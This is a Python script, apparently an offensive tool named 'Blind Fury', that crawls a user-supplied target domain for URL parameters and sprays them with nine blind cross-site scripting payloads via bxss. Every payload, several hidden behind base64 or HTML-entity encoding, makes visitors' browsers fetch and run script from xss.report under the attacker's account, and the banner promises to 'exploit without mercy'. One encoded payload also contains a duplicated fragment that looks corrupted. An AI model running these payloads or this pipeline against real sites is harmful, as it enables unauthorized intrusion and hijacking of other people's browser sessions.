import os
import tempfile
import sys
import time

# List of payloads (with placeholder for username)
payloads = [
    # Payload 1
    "'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9j/{username}O2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>'",
    # Payload 2
    "'javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://xss.report/c/{username}\\';document.body.appendChild(a)')'",
    # Payload 3 (same as Payload 2)
    "'javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://xss.report/c/{username}\\';document.body.appendChild(a)')'",
    # Payload 4
    "'\"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9j/{username}O2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>'",
    # Payload 5
    "'\"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9j/{username}O2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>'",
    # Payload 6
    "'\"><iframe srcdoc=\"&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/{username}&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;\">'",
    # Payload 7
    "'<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//xss.report/c/{username}\");a.send();</script>'",
    # Payload 8
    "'<script>$.getScript(\"//xss.report/c/{username}\")</script>'",
    # Payload 9
    "'var a=document.createElement(\"script\");a.src=\"https://xss.report/c/{username}\";document.body.appendChild(a);'"
]

# Typewriter effect function
def typewriter_effect(text, delay=0.01):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

# Banner function with typewriter animation
def banner():
    logo = """
    
██████╗ ██╗     ██╗███╗   ██╗██████╗     ███████╗██╗   ██╗██████╗ ██╗   ██╗
██╔══██╗██║     ██║████╗  ██║██╔══██╗    ██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
██████╔╝██║     ██║██╔██╗ ██║██║  ██║    █████╗  ██║   ██║██████╔╝ ╚████╔╝ 
██╔══██╗██║     ██║██║╚██╗██║██║  ██║    ██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
██████╔╝███████╗██║██║ ╚████║██████╔╝    ██║     ╚██████╔╝██║  ██║   ██║   
╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═════╝     ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
                                                                         
"""
    quote = """
Welcome to Blind Fury "Strike in silence, exploit without mercy — Blind Fury uncovers what others fear to see."
(INSPIRED BY LOSTSEC)
                                                             Author : noface
"""
    # Print the banner logo and quote using typewriter effect
    typewriter_effect(logo, delay=0.01)  # Speed up the logo printing
    typewriter_effect(quote, delay=0.05)  # Regular delay for the quote

# Function to run the initial command and capture output
def run_initial_command(domain, output_file):
    initial_command = f"subfinder -d {domain} | httpx-toolkit -silent | katana -ps -f qurl | uro | gf xss > {output_file}"
    print(f"Running initial command:\n{initial_command}\n")
    os.system(initial_command)

# Function to run bxss with each payload
def run_bxss_with_payloads(output_file, payloads, username):
    # Replace placeholder {username} in each payload with actual username
    payloads = [payload.replace('{username}', username) for payload in payloads]
    for payload in payloads:
        print(f"Running bxss with payload: {payload}\n")
        command = f"cat {output_file} | bxss -appendMode -payload \"{payload}\" -parameters"
        os.system(command)

# Main function
if __name__ == "__main__":
    banner()
    domain = input("Enter target domain: ")
    username = input("Enter your 'xss.report' username: ")
    
    # Using a temporary file to store the initial output
    with tempfile.NamedTemporaryFile(mode='w+') as temp_output:
        output_file = temp_output.name
        run_initial_command(domain, output_file)
        run_bxss_with_payloads(output_file, payloads, username)
